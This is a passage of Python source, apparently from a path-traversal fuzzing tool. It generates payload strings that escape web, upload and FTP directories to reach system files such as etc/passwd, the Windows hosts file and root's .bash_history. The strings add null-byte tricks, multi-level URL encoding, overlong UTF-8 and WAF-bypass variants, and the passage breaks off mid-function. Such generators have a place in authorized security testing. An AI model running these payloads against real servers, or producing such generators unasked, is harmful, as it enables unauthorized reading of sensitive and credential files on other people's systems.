        base_traversal_patterns.extend([
            '....//....//....//',
            '....\\\\....\\\\....\\\\',
            '..%252f..%252f..%252f',
            '..%255c..%255c..%255c',
        ])
        
        # Generate comprehensive null byte bypass patterns
        for traversal_pattern in base_traversal_patterns:
            for target_file in target_files:
                # Normalize target file to prevent double slashes/backslashes
                normalized_target = self._normalize_target_file(target_file)
                for null_encoding in null_byte_encodings:
                    for fake_extension in test_extensions:
                        # Pattern: traversal + target_file + null_byte + fake_extension
                        pattern = f"{traversal_pattern}{normalized_target}{null_encoding}{fake_extension}"
                        patterns.append(pattern)
                        
                        # Pattern: traversal + target_file + null_byte + multiple_fake_extensions
                        # Some applications check for multiple extensions
                        if len(test_extensions) > 1:
                            multi_ext = fake_extension + '.backup' + fake_extension
                            pattern_multi = f"{traversal_pattern}{normalized_target}{null_encoding}{multi_ext}"
                            patterns.append(pattern_multi)
                        
                        # Pattern with additional encoding on the target file
                        encoded_target = normalized_target.replace('/', '%2f').replace('\\', '%5c')
                        if encoded_target != normalized_target:
                            pattern_encoded = f"{traversal_pattern}{encoded_target}{null_encoding}{fake_extension}"
                            patterns.append(pattern_encoded)
        
        # Generate path validation bypass + null byte patterns
        # These combine legitimate path prefixes with null byte bypass
        legitimate_prefixes = self._get_legitimate_path_prefixes(os_type)
        
        # Limit prefixes to prevent payload explosion
        selected_prefixes = legitimate_prefixes[:10] if len(legitimate_prefixes) > 10 else legitimate_prefixes
        
        for prefix in selected_prefixes:
            for depth in range(2, min(max_depth + 1, 5)):  # Start from depth 2, limit to 4
                traversal_seq = '../' * depth
                for target_file in target_files[:5]:  # Limit target files to prevent explosion
                    clean_target = target_file.lstrip('/').lstrip('\\')
                    for null_encoding in null_byte_encodings[:8]:  # Limit null encodings
                        for fake_extension in test_extensions[:6]:  # Limit extensions
                            # Pattern: prefix + traversal + target + null + extension
                            pattern = f"{prefix}{traversal_seq}{clean_target}{null_encoding}{fake_extension}"
                            patterns.append(pattern)
        
        # Generate absolute path + null byte patterns
        absolute_files = self._get_absolute_target_files(os_type, specific_file, extra_files)
        
        for abs_file in absolute_files[:15]:  # Limit to prevent explosion
            for null_encoding in null_byte_encodings[:10]:  # Top null encodings
                for fake_extension in test_extensions[:8]:  # Top extensions
                    # Pattern: absolute_path + null_byte + fake_extension
                    pattern = f"{abs_file}{null_encoding}{fake_extension}"
                    patterns.append(pattern)
                    
                    # Pattern with URL encoding on absolute path
                    encoded_abs = abs_file.replace('/', '%2f').replace('\\', '%5c').replace(':', '%3a')
                    if encoded_abs != abs_file:
                        pattern_encoded = f"{encoded_abs}{null_encoding}{fake_extension}"
                        patterns.append(pattern_encoded)
        
        # Generate special null byte bypass patterns for specific attack scenarios
        special_null_patterns = []
        
        # Multiple null bytes (some parsers only check for single null)
        for traversal_pattern in base_traversal_patterns[:10]:  # Limit base patterns
            for target_file in target_files[:5]:  # Limit target files
                # Normalize target file to prevent double slashes/backslashes
                normalized_target = self._normalize_target_file(target_file)
                for fake_extension in test_extensions[:5]:  # Limit extensions
                    special_null_patterns.extend([
                        f"{traversal_pattern}{normalized_target}%00%00{fake_extension}",    # Double null
                        f"{traversal_pattern}{normalized_target}%00%01%00{fake_extension}", # Null + control + null
                        f"{traversal_pattern}{normalized_target}%00.{fake_extension}",     # Null + dot + extension
                        f"{traversal_pattern}{normalized_target}.%00{fake_extension}",     # Dot + null + extension
                        f"{traversal_pattern}{normalized_target}%00/{fake_extension}",     # Null + slash + extension
                        f"{traversal_pattern}{normalized_target}%00\\{fake_extension}",    # Null + backslash + extension
                        f"{traversal_pattern}{normalized_target}%2500{fake_extension}",    # Double encoded null
                        f"{traversal_pattern}{normalized_target}%252500{fake_extension}",  # Triple encoded null
                    ])
        
        patterns.extend(special_null_patterns)
        
        # Generate filename truncation bypass patterns
        # Some systems truncate long filenames, which can bypass validation
        long_fake_names = [
            'A' * 50 + '.png',
            'B' * 100 + '.jpg', 
            'C' * 200 + '.pdf',
            'verylongfilenamethatmightbetcated' * 3 + '.txt',
        ]
        
        for traversal_pattern in base_traversal_patterns[:5]:  # Limit patterns
            for target_file in target_files[:3]:  # Limit target files
                # Normalize target file to prevent double slashes/backslashes
                normalized_target = self._normalize_target_file(target_file)
                for null_encoding in ['%00', '%2500']:  # Main null encodings
                    for long_name in long_fake_names:
                        pattern = f"{traversal_pattern}{normalized_target}{null_encoding}{long_name}"
                        patterns.append(pattern)
        
        # Remove duplicates while preserving order
        unique_patterns = []
        seen = set()
        for pattern in patterns:
            if pattern not in seen and len(pattern) > 10:  # Filter out too short patterns
                unique_patterns.append(pattern)
                seen.add(pattern)
        
        return unique_patterns

    def _get_target_files(
        self, 
        os_type: OSType, 
        specific_file: Optional[str], 
        extra_files: bool
    ) -> List[str]:
        """Get list of target files based on OS type and settings"""
        if specific_file:
            return [specific_file]

        target_files = []
        
        if os_type == OSType.WINDOWS:
            target_files.extend(self.WINDOWS_FILES)
        elif os_type == OSType.UNIX:
            target_files.extend(self.UNIX_FILES)
        else:  # GENERIC
            target_files.extend(self.WINDOWS_FILES)
            target_files.extend(self.UNIX_FILES)

        if extra_files:
            target_files.extend(self.EXTRA_FILES)

        return target_files

    def _normalize_target_file(self, target_file: str) -> str:
        """
        Normalize target file by removing leading path separators to prevent double slashes
        
        This prevents issues like:
        - ../etc/passwd + /etc/passwd -> ..//etc/passwd (should be ../etc/passwd)
        - ..\etc\passwd + \etc\passwd -> ..\\\etc\passwd (should be ..\etc\passwd)
        
        Args:
            target_file: Target file path to normalize
            
        Returns:
            Normalized target file without leading separators
        """
        if not target_file:
            return target_file
            
        # Strip leading forward slashes and backslashes
        normalized = target_file.lstrip('/').lstrip('\\')
        
        return normalized

    def _adapt_file_slashes(self, target_file: str, traversal_pattern: str) -> str:
        """
        Adapt file slashes based on traversal pattern encoding
        
        If traversal pattern includes backslashes, replace slashes in filenames with backslashes
        and vice versa. Also handle different encoding representations.
        """
        adapted_file = target_file

        # Check if pattern contains specific encodings and adapt accordingly
        # Handle multiple encoding levels: %2f, %252f, %25252f, %2525252f, %252525252f
        pattern_lower = traversal_pattern.lower()
        
        if any(x in pattern_lower for x in ["%2f", "%252f", "%25252f", "%2525252f", "%252525252f"]):
            # Pattern contains URL-encoded forward slashes, encode target file slashes
            adapted_file = adapted_file.replace("/", "%2f").replace("\\\\", "%5c")
        elif any(x in pattern_lower for x in ["%5c", "%255c", "%25255c", "%2525255c", "%252525255c"]):
            # Pattern contains URL-encoded backslashes, encode target file slashes  
            adapted_file = adapted_file.replace("/", "%2f").replace("\\\\", "%5c")
        elif "\\\\" in traversal_pattern:
            # Pattern contains literal backslashes, use backslashes in target file
            adapted_file = adapted_file.replace("/", "\\\\")
        elif "/" in traversal_pattern:
            # Pattern contains literal forward slashes, ensure forward slashes in target file
            adapted_file = adapted_file.replace("\\\\", "/")

        return adapted_file

    def _generate_path_validation_bypass_patterns(
        self, 
        os_type: OSType, 
        specific_file: Optional[str], 
        extra_files: bool, 
        extension: Optional[str],
        max_depth: int
    ) -> List[str]:
        """
        Generate path validation bypass patterns for applications that validate start of path
        
        These patterns target vulnerabilities where applications check that a path starts
        with a legitimate directory but fail to prevent traversal out of it.
        
        Examples:
        - /var/www/images/../../../etc/passwd
        - C:\\inetpub\\wwwroot\\uploads\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
        - /home/user/documents/../../../root/.bash_history
        
        This covers OWASP "File path traversal, validation of start of path" scenarios.
        """
        patterns = []
        
        # Define legitimate path prefixes that applications commonly validate
        legitimate_prefixes = self._get_legitimate_path_prefixes(os_type)
        
        # Get target files we want to access
        target_files = self._get_target_files(os_type, specific_file, extra_files)
        
        # Generate comprehensive traversal sequences for different depths
        traversal_sequences = self._generate_traversal_sequences_for_validation_bypass(max_depth)
        
        # Generate patterns: legitimate_prefix + traversal_sequence + target_file
        for prefix in legitimate_prefixes:
            for sequence in traversal_sequences:
                for target_file in target_files:
                    # Remove leading slash from target file to avoid double slashes
                    # since prefixes already end with '/' and sequences often end with '/'
                    clean_target = target_file.lstrip('/').lstrip('\\\\')
                    
                    # Create the complete path validation bypass pattern
                    pattern = prefix + sequence + clean_target
                    
                    if extension:
                        pattern += extension
                    
                    patterns.append(pattern)
                    
                    # Add encoded variations
                    encoded_variations = self._generate_encoded_variations_for_path_validation(pattern)
                    patterns.extend(encoded_variations)
                    
                    # Add null byte bypass variations for path validation scenarios
                    null_byte_variations = self._generate_null_byte_variations_for_path_validation(
                        prefix, sequence, clean_target, extension
                    )
                    patterns.extend(null_byte_variations)
        
        return patterns

    def _get_legitimate_path_prefixes(self, os_type: OSType) -> List[str]:
        """
        Get list of legitimate path prefixes that applications commonly validate against
        
        These are paths that applications often consider "safe" starting points,
        but can be escaped from using traversal sequences.
        """
        prefixes = []
        
        if os_type == OSType.UNIX or os_type == OSType.GENERIC:
            # Common Unix/Linux legitimate prefixes
            unix_prefixes = [
                # Web server directories - Base paths
                "/var/www/html/",
                "/var/www/",
                "/usr/share/nginx/html/",
                "/var/www/nginx-default/",
                "/opt/lampp/htdocs/",
                "/srv/www/",
                "/srv/http/",
                "/home/user/public_html/",
                
                # Web server subdirectories - CRITICAL for path validation bypass
                "/var/www/images/",
                "/var/www/uploads/",
                "/var/www/files/",
                "/var/www/documents/",
                "/var/www/assets/",
                "/var/www/media/",
                "/var/www/static/",
                "/var/www/content/",
                "/var/www/data/",
                "/var/www/public/",
                "/var/www/html/images/",
                "/var/www/html/uploads/",
                "/var/www/html/files/",
                "/var/www/html/documents/",
                "/var/www/html/assets/",
                "/var/www/html/media/",
                "/var/www/html/static/",
                "/var/www/html/content/",
                "/var/www/html/css/",
                "/var/www/html/js/",
                "/var/www/html/admin/",
                "/var/www/html/user/",
                "/var/www/html/public/",
                "/var/www/html/storage/",
                "/var/www/html/wp-content/uploads/",
                "/var/www/html/sites/default/files/",
                "/usr/share/nginx/html/images/",
                "/usr/share/nginx/html/uploads/",
                "/usr/share/nginx/html/files/",
                "/usr/share/nginx/html/assets/",
                "/usr/share/nginx/html/static/",
                "/srv/www/images/",
                "/srv/www/uploads/",
                "/srv/www/files/",
                "/srv/www/static/",
                "/srv/http/images/",
                "/srv/http/uploads/",
                "/srv/http/files/",
                "/srv/http/static/",
                
                # User directories
                "/home/user/",
                "/home/user/documents/",
                "/home/user/downloads/",
                "/home/user/public/",
                "/home/user/Desktop/",
                "/home/user/pictures/",
                "/home/user/videos/",
                "/home/user/music/",
                "/home/www-data/",
                "/home/www-data/uploads/",
                "/home/www-data/files/",
                
                # Application directories
                "/opt/app/",
                "/opt/app/files/",
                "/opt/app/uploads/",
                "/opt/app/images/",
                "/opt/app/documents/",
                "/opt/app/data/",
                "/opt/app/public/",
                "/usr/local/app/",
                "/usr/local/app/files/",
                "/usr/local/app/uploads/",
                "/usr/local/app/public/",
                "/usr/share/app/",
                "/usr/share/app/files/",
                "/usr/share/app/public/",
                
                # Temporary and upload directories
                "/tmp/",
                "/tmp/uploads/",
                "/tmp/files/",
                "/tmp/images/",
                "/tmp/documents/",
                "/var/tmp/",
                "/var/tmp/uploads/",
                "/var/tmp/files/",
                "/var/uploads/",
                "/var/uploads/files/",
                "/var/uploads/images/",
                "/var/uploads/documents/",
                "/var/files/",
                "/var/files/uploads/",
                "/var/files/documents/",
                
                # FTP directories
                "/var/ftp/",
                "/var/ftp/pub/",
                "/var/ftp/pub/uploads/",
                "/var/ftp/pub/files/",
                "/var/ftp/pub/documents/",
                "/home/ftp/",
                "/home/ftp/uploads/",
                "/home/ftp/files/",
                "/home/ftp/public/",
                "/srv/ftp/",
                "/srv/ftp/uploads/",
                "/srv/ftp/files/",
                "/srv/ftp/public/",
                
                # Log directories (often accessible)
                "/var/log/app/",
                "/var/log/apache2/",
                "/var/log/nginx/",
            ]
            prefixes.extend(unix_prefixes)
        
        if os_type == OSType.WINDOWS or os_type == OSType.GENERIC:
            # Common Windows legitimate prefixes
            windows_prefixes = [
                # IIS and web server directories - Base paths
                "C:\\inetpub\\wwwroot\\",
                "C:\\inetpub\\ftproot\\",
                "D:\\www\\",
                "E:\\www\\",
                
                # IIS and web server subdirectories - CRITICAL for path validation bypass
                "C:\\inetpub\\wwwroot\\images\\",
                "C:\\inetpub\\wwwroot\\uploads\\",
                "C:\\inetpub\\wwwroot\\files\\",
                "C:\\inetpub\\wwwroot\\documents\\",
                "C:\\inetpub\\wwwroot\\assets\\",
                "C:\\inetpub\\wwwroot\\media\\",
                "C:\\inetpub\\wwwroot\\static\\",
                "C:\\inetpub\\wwwroot\\content\\",
                "C:\\inetpub\\wwwroot\\data\\",
                "C:\\inetpub\\wwwroot\\public\\",
                "C:\\inetpub\\wwwroot\\css\\",
                "C:\\inetpub\\wwwroot\\js\\",
                "C:\\inetpub\\wwwroot\\admin\\",
                "C:\\inetpub\\wwwroot\\user\\",
                "C:\\inetpub\\wwwroot\\storage\\",
                "C:\\inetpub\\wwwroot\\admin\\uploads\\",
                "C:\\inetpub\\wwwroot\\user\\files\\",
                "C:\\inetpub\\wwwroot\\public\\images\\",
                "C:\\inetpub\\wwwroot\\storage\\uploads\\",
                
                # FTP root subdirectories
                "C:\\inetpub\\ftproot\\uploads\\",
                "C:\\inetpub\\ftproot\\files\\",
                "C:\\inetpub\\ftproot\\documents\\",
                "C:\\inetpub\\ftproot\\public\\",
                "C:\\inetpub\\ftproot\\images\\",
                
                # Alternative drive web directories
                "D:\\www\\images\\",
                "D:\\www\\uploads\\",
                "D:\\www\\files\\",
                "D:\\www\\documents\\",
                "D:\\www\\static\\",
                "D:\\www\\assets\\",
                "D:\\www\\public\\",
                "E:\\www\\images\\",
                "E:\\www\\uploads\\",
                "E:\\www\\files\\",
                "E:\\www\\static\\",
                
                # User directories
                "C:\\Users\\Public\\",
                "C:\\Users\\Public\\Documents\\",
                "C:\\Users\\Public\\Downloads\\",
                "C:\\Users\\Public\\Pictures\\",
                "C:\\Users\\Public\\Videos\\",
                "C:\\Users\\User\\",
                "C:\\Users\\User\\Documents\\",
                "C:\\Users\\User\\Desktop\\",
                "C:\\Users\\User\\Downloads\\",
                "C:\\Users\\User\\Pictures\\",
                "C:\\Users\\Administrator\\Documents\\",
                "C:\\Users\\Guest\\Documents\\",
                
                # Application directories
                "C:\\Program Files\\App\\",
                "C:\\Program Files\\App\\files\\",
                "C:\\Program Files\\App\\uploads\\",
                "C:\\Program Files\\App\\data\\",
                "C:\\Program Files\\App\\public\\",
                "C:\\Program Files (x86)\\App\\",
                "C:\\Program Files (x86)\\App\\files\\",
                "C:\\Program Files (x86)\\App\\uploads\\",
                "C:\\App\\",
                "C:\\App\\files\\",
                "C:\\App\\uploads\\",
                "C:\\App\\data\\",
                "C:\\App\\public\\",
                "C:\\App\\documents\\",
                
                # Temporary and upload directories
                "C:\\Temp\\",
                "C:\\Temp\\uploads\\",
                "C:\\Temp\\files\\",
                "C:\\Temp\\documents\\",
                "C:\\Windows\\Temp\\",
                "C:\\Windows\\Temp\\uploads\\",
                "C:\\uploads\\",
                "C:\\uploads\\files\\",
                "C:\\uploads\\images\\",
                "C:\\files\\",
                "C:\\files\\uploads\\",
                "C:\\files\\documents\\",
                
                # FTP directories
                "C:\\FTP\\",
                "C:\\FTP\\uploads\\",
                "C:\\FTP\\files\\",
                "C:\\FTP\\public\\",
                "C:\\FTP\\documents\\",
                
                # Alternative drive directories
                "D:\\uploads\\",
                "D:\\uploads\\files\\",
                "D:\\uploads\\images\\",
                "D:\\files\\",
                "D:\\files\\uploads\\",
                "D:\\files\\documents\\",
                "E:\\files\\",
                "E:\\files\\uploads\\",
                "E:\\files\\documents\\",
                "E:\\uploads\\",
                "E:\\uploads\\files\\",
            ]
            prefixes.extend(windows_prefixes)
        
        return prefixes

    def _generate_traversal_sequences_for_validation_bypass(self, max_depth: int) -> List[str]:
        """
        Generate traversal sequences specifically for path validation bypass
        
        These sequences are designed to escape from legitimate prefixes and
        navigate to sensitive files on the system.
        """
        sequences = []
        
        # Standard traversal sequences with different depths
        for depth in range(1, max_depth + 1):
            # Unix-style traversal
            unix_sequence = "../" * depth
            sequences.append(unix_sequence)
            
            # Windows-style traversal
            windows_sequence = "..\\" * depth
            sequences.append(windows_sequence)
            
            # Mixed slash traversal (sometimes works)
            mixed_sequence = "../" * (depth // 2) + "..\\" * (depth - depth // 2)
            if mixed_sequence not in sequences:
                sequences.append(mixed_sequence)
        
        # Add encoded traversal sequences
        for depth in range(1, min(max_depth + 1, 6)):  # Limit encoded depth for performance
            # URL encoded sequences
            sequences.extend([
                "%2e%2e%2f" * depth,  # URL encoded ../
                "%2e%2e%5c" * depth,  # URL encoded ..\
                "%2E%2E%2F" * depth,  # URL encoded ../ (uppercase)
                "%2E%2E%5C" * depth,  # URL encoded ..\ (uppercase)
                
                # Double URL encoded
                "%252e%252e%252f" * depth,
                "%252e%252e%255c" * depth,
                
                # Mixed encoding
                "../" * (depth // 2) + "%2e%2e%2f" * (depth - depth // 2),
                "..\\" * (depth // 2) + "%2e%2e%5c" * (depth - depth // 2),
            ])
        
        # Add non-recursive bypass sequences for path validation
        for depth in range(1, min(max_depth + 1, 4)):
            # These patterns bypass filters that only remove '../' once
            sequences.extend([
                "....//....//..../",
                "....\\\\....\\\\....\\",
                "..\\/..\\/..\\/",
                "../\\../\\..\\",
                "..%252f..%252f..%252f",
                "..%255c..%255c..%255c",
            ])
        
        # Remove duplicates while preserving order
        unique_sequences = []
        for seq in sequences:
            if seq not in unique_sequences:
                unique_sequences.append(seq)
        
        return unique_sequences

    def _generate_encoded_variations_for_path_validation(self, pattern: str) -> List[str]:
        """
        Generate encoded variations of path validation bypass patterns
        
        These variations help bypass different types of input filtering and WAFs.
        Focuses on comprehensive encoding for subdirectory + traversal patterns.
        """
        variations = []
        
        # Basic URL encoding variations
        variations.extend([
            pattern.replace('/', '%2f').replace('\\', '%5c'),
            pattern.replace('/', '%2F').replace('\\', '%5C'),
            pattern.replace('../', '%2e%2e%2f'),
            pattern.replace('..\\', '%2e%2e%5c'),
            pattern.replace('../', '%2E%2E%2F'),  # Uppercase
            pattern.replace('..\\', '%2E%2E%5C'),  # Uppercase
        ])
        
        # Double URL encoding variations (critical for WAF bypass)
        variations.extend([
            pattern.replace('../', '%252e%252e%252f'),
            pattern.replace('..\\', '%252e%252e%255c'),
            pattern.replace('../', '%252E%252E%252F'),  # Uppercase double
            pattern.replace('..\\', '%252E%252E%255C'),  # Uppercase double
        ])
        
        # Triple URL encoding for advanced WAF bypass
        variations.extend([
            pattern.replace('../', '%25252e%25252e%25252f'),
            pattern.replace('..\\', '%25252e%25252e%25255c'),
        ])
        
        # Mixed encoding combinations (single + double, etc.)
        variations.extend([
            pattern.replace('../', '%2e%2e%252f'),      # Mixed encoding
            pattern.replace('../', '%252e%2e%2f'),      # Mixed encoding
            pattern.replace('..\\', '%2e%2e%255c'),     # Mixed encoding
            pattern.replace('..\\', '%252e%2e%5c'),     # Mixed encoding
        ])
        
        # Path separator variations with encoding
        variations.extend([
            pattern.replace('/', '%2f'),               # Encode all forward slashes
            pattern.replace('\\', '%5c'),              # Encode all backslashes
            pattern.replace('/', '%252f'),             # Double encode all forward slashes
            pattern.replace('\\', '%255c'),            # Double encode all backslashes
            pattern.replace('/', '\\'),                # Forward to backslash
            pattern.replace('\\', '/'),                # Backslash to forward
            pattern.replace('/', '\\/'),               # Escaped forward slash
            pattern.replace('\\', '\\\\'),             # Double backslash
        ])
        
        # Unicode and alternative encoding techniques
        variations.extend([
            pattern.replace('../', '%c0%ae%c0%ae%2f'),  # UTF-8 overlong encoding
            pattern.replace('../', '%e0%80%ae%e0%80%ae%2f'),  # Invalid UTF-8
            pattern.replace('../', '%%32%%65%%32%%65%%32%%66'),  # Double percent encoding
            pattern.replace('../', '%uff0e%uff0e%2f'),  # Unicode fullwidth
        ])
        
        # Comprehensive subdirectory path encoding
        # Handle common subdirectories with various encodings
        subdirs = ['images/', 'uploads/', 'files/', 'documents/', 'assets/', 'media/', 'static/', 'public/', 'data/', 'content/']
        for subdir in subdirs:
            if subdir in pattern:
                # URL encode subdirectory name
                encoded_subdir = subdir.replace('/', '%2f')
                variations.append(pattern.replace(subdir, encoded_subdir))
                # Double URL encode subdirectory name
                double_encoded_subdir = subdir.replace('/', '%252f')
                variations.append(pattern.replace(subdir, double_encoded_subdir))
                # Mixed case subdirectory
                variations.append(pattern.replace(subdir, subdir.upper()))
                variations.append(pattern.replace(subdir, subdir.lower()))
        
        # Case variations for Windows paths
        if 'C:' in pattern or any(win_path in pattern for win_path in ['\\windows\\', '\\program files\\', '\\inetpub\\']):
            variations.extend([
                pattern.lower(),
                pattern.upper(),
                pattern.replace('C:', 'c:').replace('\\Windows\\', '\\WINDOWS\\'),
                pattern.replace('C:\\', 'C%3A%5C'),          # URL encode C:\
                pattern.replace('C:\\', 'C%253A%255C'),      # Double URL encode C:\
                pattern.replace('\\Windows\\', '%5CWindows%5C'),  # URL encode Windows path
                pattern.replace('\\Windows\\', '%255CWindows%255C'),  # Double URL encode
            ])
        
        # Linux path encoding variations
        if '/var/' in pattern or '/etc/' in pattern or '/home/' in pattern:
            variations.extend([
                pattern.replace('/var/', '%2Fvar%2F'),        # URL encode /var/
                pattern.replace('/var/', '%252Fvar%252F'),    # Double URL encode /var/
                pattern.replace('/etc/', '%2Fetc%2F'),        # URL encode /etc/
                pattern.replace('/etc/', '%252Fetc%252F'),    # Double URL encode /etc/
                pattern.replace('/home/', '%2Fhome%2F'),      # URL encode /home/
                pattern.replace('/home/', '%252Fhome%252F'),  # Double URL encode /home/
            ])
        
        # Remove duplicates and the original pattern
        unique_variations = []
        for var in variations:
            if var != pattern and var not in unique_variations and len(var) > 10:
                unique_variations.append(var)
        
        return unique_variations

    def _generate_null_byte_variations_for_path_validation(
        self, 
        prefix: str, 
        sequence: str, 
        target_file: str, 
        extension: Optional[str]
    ) -> List[str]:
        """
        Generate null byte bypass variations specifically for path validation scenarios
        
        These patterns combine legitimate path prefixes with traversal sequences and
        null byte bypass techniques to evade both path validation and extension validation.
        
        Args:
            prefix: Legitimate path prefix (e.g., '/var/www/images/')
            sequence: Traversal sequence (e.g., '../../../')
            target_file: Target file to access (e.g., 'etc/passwd')
            extension: Optional extension that might be validated
            
        Returns:
            List of null byte bypass variations for path validation
        """
        variations = []
        
        # Core null byte encodings for path validation bypass
        null_encodings = [
            '%00', '%2500', '%252500',  # Standard + double + triple URL encoding
            '%c0%80', '%e0%80%80',      # UTF-8 overlong encodings
            '%00%20', '%20%00',         # Null with space variations
        ]
        
        # Common file extensions for validation bypass
        fake_extensions = ['.png', '.jpg', '.pdf', '.txt', '.log', '.backup']
        
        # If extension is provided, prioritize it
        if extension:
            if not extension.startswith('.'):
                extension = '.' + extension
            test_extensions = [extension] + [ext for ext in fake_extensions if ext != extension]
        else:
            test_extensions = fake_extensions
        
        # Generate null byte bypass patterns for path validation
        for null_enc in null_encodings:
            for fake_ext in test_extensions[:4]:  # Limit to prevent explosion
                # Basic pattern: prefix + sequence + target + null + fake_extension
                pattern = f"{prefix}{sequence}{target_file}{null_enc}{fake_ext}"
                variations.append(pattern)
                
                # Pattern with multiple fake extensions
                multi_ext = fake_ext + '.backup'
                pattern_multi = f"{prefix}{sequence}{target_file}{null_enc}{multi_ext}"
                variations.append(pattern_multi)
                
                # Pattern with encoded sequence
                encoded_sequence = sequence.replace('../', '%2e%2e%2f').replace('..\\', '%2e%2e%5c')
                if encoded_sequence != sequence:
                    pattern_encoded = f"{prefix}{encoded_sequence}{target_file}{null_enc}{fake_ext}"
                    variations.append(pattern_encoded)
                
                # Pattern with double null bytes (bypass double-check filters)
                double_null = null_enc + '%00'
                pattern_double = f"{prefix}{sequence}{target_file}{double_null}{fake_ext}"
                variations.append(pattern_double)
                
                # Pattern with null byte in the middle of filename
                if '/' in target_file or '\\' in target_file:
                    # Insert null byte before last path component
                    parts = target_file.replace('\\', '/').split('/')
                    if len(parts) > 1:
                        modified_target = '/'.join(parts[:-1]) + null_enc + '/' + parts[-1]
                        pattern_mid = f"{prefix}{sequence}{modified_target}{fake_ext}"
                        variations.append(pattern_mid)
        
        # Generate prefix-specific null byte bypass patterns
        # Target common subdirectory validation scenarios
        subdirs = ['images', 'uploads', 'files', 'documents', 'media', 'static']
        
        for subdir in subdirs:
            if subdir in prefix.lower():
                # Pattern that bypasses subdirectory restriction with null byte
                for null_enc in null_encodings[:3]:  # Limit encodings
                    for fake_ext in test_extensions[:3]:  # Limit extensions
                        # Inject null byte after subdirectory name to bypass validation
                        modified_prefix = prefix.replace(f'{subdir}/', f'{subdir}{null_enc}/')
                        if modified_prefix != prefix:
                            pattern = f"{modified_prefix}{sequence}{target_file}{fake_ext}"
                            variations.append(pattern)
        
        # Generate double-encoding combinations for advanced WAF bypass
        for fake_ext in test_extensions[:2]:  # Limit to prevent explosion
            # Combine double URL encoding of sequence with null byte bypass
            double_encoded_seq = sequence.replace('../', '%252e%252e%252f').replace('..\\', '%252e%252e%255c')
            if double_encoded_seq != sequence:
                pattern = f"{prefix}{double_encoded_seq}{target_file}%2500{fake_ext}"
                variations.append(pattern)
                
                # Triple encoding combination
                triple_encoded_seq = sequence.replace('../', '%25252e%25252e%25252f')
                if triple_encoded_seq != sequence:
                    pattern_triple = f"{prefix}{triple_encoded_seq}{target_file}%252500{fake_ext}"
                    variations.append(pattern_triple)
        
        # Filter out duplicates and invalid patterns
        unique_variations = []
        for var in variations:
            if var not in unique_variations and len(var) > 15:  # Minimum length check
                unique_variations.append(var)
        
        return unique_variations

    def _generate_absolute_patterns(
        self, 
        os_type: OSType, 
        specific_file: Optional[str], 
        extra_files: bool, 
        extension: Optional[str]
    ) -> List[str]:
        """
        Generate direct absolute path injection patterns
        
        These patterns test for vulnerabilities where applications fail to validate
        absolute paths or where path normalization is insufficient.
        """
        absolute_files = self._get_absolute_target_files(os_type, specific_file, extra_files)
        
        patterns = []
        for abs_file in absolute_files:
            # Add the direct absolute path
            pattern = abs_file
            if extension:
                pattern += extension
            patterns.append(pattern)
            
            # Add URL-encoded variations for absolute paths
            encoded_variations = [
                abs_file.replace('/', '%2f').replace('\\', '%5c'),
                abs_file.replace('/', '%2F').replace('\\', '%5C'),
                abs_file.replace('/', '\\'),  # Switch slashes
                abs_file.replace('\\', '/'),  # Switch slashes
            ]
            
            for variation in encoded_variations:
                if variation != abs_file:  # Avoid duplicates
                    pattern = variation
                    if extension:
                        pattern += extension
                    patterns.append(pattern)
            
            # Add null byte bypass variations for absolute paths
            null_byte_variations = self._generate_null_byte_variations_for_absolute_paths(abs_file, extension)
            patterns.extend(null_byte_variations)
        
        return patterns

    def _generate_null_byte_variations_for_absolute_paths(
        self, 
        absolute_file: str, 
        extension: Optional[str]
    ) -> List[str]:
        """
        Generate null byte bypass variations for absolute path injection
        
        These patterns target scenarios where applications accept absolute paths
        but validate file extensions, allowing null byte bypass to circumvent
        extension validation while accessing arbitrary files.
        
        Args:
            absolute_file: Absolute path to target file
            extension: Optional extension that might be validated
            
        Returns:
            List of null byte bypass variations for absolute paths
        """
        variations = []
        
        # Null byte encodings for absolute path bypass
        null_encodings = [
            '%00', '%2500', '%252500', '%25252500',  # Multiple URL encoding levels
            '%c0%80', '%e0%80%80', '%f0%80%80%80',   # UTF-8 overlong encodings
            '%u0000',                               # Unicode encoding
            '%01', '%02', '%0a', '%0d',             # Alternative control characters
        ]
        
        # File extensions for validation bypass
        fake_extensions = [
            '.png', '.jpg', '.jpeg', '.gif', '.pdf', '.txt', '.log', 
            '.xml', '.json', '.csv', '.doc', '.docx', '.zip'
        ]
        
        # If extension provided, prioritize it
        if extension:
            if not extension.startswith('.'):
                extension = '.' + extension
            test_extensions = [extension] + [ext for ext in fake_extensions if ext != extension]
        else:
            test_extensions = fake_extensions
        
        # Generate basic null byte bypass patterns
        for null_enc in null_encodings:
            for fake_ext in test_extensions[:6]:  # Limit to prevent explosion
                # Pattern: absolute_path + null_byte + fake_extension
                pattern = f"{absolute_file}{null_enc}{fake_ext}"
                variations.append(pattern)
                
                # Pattern with multiple fake extensions
                multi_ext = fake_ext + '.backup'
                pattern_multi = f"{absolute_file}{null_enc}{multi_ext}"
                variations.append(pattern_multi)
                
                # Pattern with space before null byte (edge case)
                pattern_space = f"{absolute_file} {null_enc}{fake_ext}"
                variations.append(pattern_space)
                
                # Pattern with double null bytes
                double_null = null_enc + '%00'
                pattern_double = f"{absolute_file}{double_null}{fake_ext}"
                variations.append(pattern_double)
        
        # Generate encoded absolute path + null byte combinations
        encoded_absolute_variations = [
            absolute_file.replace('/', '%2f').replace('\\', '%5c').replace(':', '%3a'),  # Full URL encoding
            absolute_file.replace('/', '%252f').replace('\\', '%255c').replace(':', '%253a'),  # Double encoding
            absolute_file.replace('C:', 'c:').lower(),  # Case variation for Windows
            absolute_file.upper(),  # Full uppercase
        ]
        
        for encoded_abs in encoded_absolute_variations:
            if encoded_abs != absolute_file:  # Avoid duplicates
                for null_enc in null_encodings[:4]:  # Limit null encodings
                    for fake_ext in test_extensions[:4]:  # Limit extensions
                        pattern = f"{encoded_abs}{null_enc}{fake_ext}"
                        variations.append(pattern)
        
        # Generate path component null byte injection
        # Inject null bytes in different parts of the path
        path_parts = absolute_file.replace('\\', '/').split('/')
        if len(path_parts) > 2:  # Need at least drive/root + directory + file
            for i in range(1, len(path_parts)):  # Skip root/drive part
                for null_enc in ['%00', '%2500']:  # Main null encodings
                    for fake_ext in test_extensions[:3]:  # Limit extensions
                        # Inject null byte after path component
                        modified_parts = path_parts.copy()
                        modified_parts[i] = modified_parts[i] + null_enc
                        modified_path = '/'.join(modified_parts)
                        
                        # Restore original separators if it was Windows path
                        if '\\' in absolute_file:
                            modified_path = modified_path.replace('/', '\\')
                        
